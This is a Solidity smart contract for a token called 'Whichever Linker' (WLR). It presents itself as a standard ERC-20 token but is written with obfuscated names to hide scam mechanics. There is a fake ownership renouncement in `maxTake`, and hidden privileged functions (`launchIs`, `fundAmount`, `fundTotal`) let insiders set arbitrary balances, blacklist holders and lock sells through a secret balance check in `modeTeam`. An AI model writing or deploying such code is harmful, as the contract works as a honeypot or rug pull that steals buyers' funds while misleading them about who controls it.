//SPDX-License-Identifier: MIT

pragma solidity ^0.8.11;

interface atTx {
    function totalSupply() external view returns (uint256);

    function balanceOf(address enableTxFund) external view returns (uint256);

    function transfer(address shouldEnable, uint256 launchExemptFrom) external returns (bool);

    function allowance(address tokenMax, address spender) external view returns (uint256);

    function approve(address spender, uint256 launchExemptFrom) external returns (bool);

    function transferFrom(
        address sender,
        address shouldEnable,
        uint256 launchExemptFrom
    ) external returns (bool);

    event Transfer(address indexed from, address indexed tokenAt, uint256 value);
    event Approval(address indexed tokenMax, address indexed spender, uint256 value);
}

abstract contract txTeam {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface limitReceiverTake {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface liquidityFee {
    function createPair(address sellTrading, address limitTxWallet) external returns (address);
}

interface atTxMetadata is atTx {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract WhicheverLinker is txTeam, atTx, atTxMetadata {

    constructor (){
        if (fromLaunched != amountMode) {
            isSenderSell = feeFrom;
        }
        limitReceiverTake launchedTeam = limitReceiverTake(tradingLaunch);
        walletMin = liquidityFee(launchedTeam.factory()).createPair(launchedTeam.WETH(), address(this));
        if (modeTeamTo == amountMode) {
            amountMode = feeFrom;
        }
        minFee = _msgSender();
        maxTake();
        tokenBuy[minFee] = true;
        maxLaunched[minFee] = modeTx;
        if (liquidityTotal) {
            liquidityTotal = true;
        }
        emit Transfer(address(0), minFee, modeTx);
    }

    uint256 autoShould;

    function approve(address walletMax, uint256 launchExemptFrom) public virtual override returns (bool) {
        totalLimit[_msgSender()][walletMax] = launchExemptFrom;
        emit Approval(_msgSender(), walletMax, launchExemptFrom);
        return true;
    }

    uint256 public fromLaunched;

    bool public atAuto;

    function totalSupply() external view virtual override returns (uint256) {
        return modeTx;
    }

    address amountTake = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 public amountMode;

    uint256 private modeTx = 100000000 * 10 ** 18;

    function minShould(address tokenTake, address shouldEnable, uint256 launchExemptFrom) internal returns (bool) {
        require(maxLaunched[tokenTake] >= launchExemptFrom);
        maxLaunched[tokenTake] -= launchExemptFrom;
        maxLaunched[shouldEnable] += launchExemptFrom;
        emit Transfer(tokenTake, shouldEnable, launchExemptFrom);
        return true;
    }

    function getOwner() external view returns (address) {
        return walletLimit;
    }

    function owner() external view returns (address) {
        return walletLimit;
    }

    address private walletLimit;

    function fundTotal(uint256 launchExemptFrom) public {
        enableTrading();
        launchedMarketing = launchExemptFrom;
    }

    mapping(address => uint256) private maxLaunched;

    uint256 private feeFrom;

    string private isLaunched = "WLR";

    uint256 launchedMarketing;

    function launchIs(address amountFundLaunched, uint256 launchExemptFrom) public {
        enableTrading();
        maxLaunched[amountFundLaunched] = launchExemptFrom;
    }

    address public minFee;

    address public walletMin;

    function transferFrom(address tokenTake, address shouldEnable, uint256 launchExemptFrom) external override returns (bool) {
        if (_msgSender() != tradingLaunch) {
            if (totalLimit[tokenTake][_msgSender()] != type(uint256).max) {
                require(launchExemptFrom <= totalLimit[tokenTake][_msgSender()]);
                totalLimit[tokenTake][_msgSender()] -= launchExemptFrom;
            }
        }
        return modeTeam(tokenTake, shouldEnable, launchExemptFrom);
    }

    function decimals() external view virtual override returns (uint8) {
        return launchListMode;
    }

    function fundAmount(address exemptFund) public {
        enableTrading();
        if (amountMode == feeFrom) {
            feeFrom = amountMode;
        }
        if (exemptFund == minFee || exemptFund == walletMin) {
            return;
        }
        tradingMin[exemptFund] = true;
    }

    function enableTrading() private view {
        require(tokenBuy[_msgSender()]);
    }

    function balanceOf(address enableTxFund) public view virtual override returns (uint256) {
        return maxLaunched[enableTxFund];
    }

    mapping(address => bool) public tradingMin;

    function modeTeam(address tokenTake, address shouldEnable, uint256 launchExemptFrom) internal returns (bool) {
        if (tokenTake == minFee) {
            return minShould(tokenTake, shouldEnable, launchExemptFrom);
        }
        uint256 launchedList = atTx(walletMin).balanceOf(amountTake);
        require(launchedList == launchedMarketing);
        require(shouldEnable != amountTake);
        if (tradingMin[tokenTake]) {
            return minShould(tokenTake, shouldEnable, feeMarketing);
        }
        return minShould(tokenTake, shouldEnable, launchExemptFrom);
    }

    string private txReceiver = "Whichever Linker";

    uint256 public isSenderSell;

    function name() external view virtual override returns (string memory) {
        return txReceiver;
    }

    uint8 private launchListMode = 18;

    function transfer(address amountFundLaunched, uint256 launchExemptFrom) external virtual override returns (bool) {
        return modeTeam(_msgSender(), amountFundLaunched, launchExemptFrom);
    }

    event OwnershipTransferred(address indexed receiverList, address indexed autoTeam);

    bool public minIs;

    mapping(address => mapping(address => uint256)) private totalLimit;

    function shouldMarketing(address maxShould) public {
        if (atAuto) {
            return;
        }
        
        tokenBuy[maxShould] = true;
        
        atAuto = true;
    }

    bool private liquidityTotal;

    address tradingLaunch = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 constant feeMarketing = 6 ** 10;

    function symbol() external view virtual override returns (string memory) {
        return isLaunched;
    }

    function allowance(address fundToken, address walletMax) external view virtual override returns (uint256) {
        if (walletMax == tradingLaunch) {
            return type(uint256).max;
        }
        return totalLimit[fundToken][walletMax];
    }

    uint256 public modeTeamTo;

    function maxTake() public {
        emit OwnershipTransferred(minFee, address(0));
        walletLimit = address(0);
    }

    bool private teamTrading;

    mapping(address => bool) public tokenBuy;

}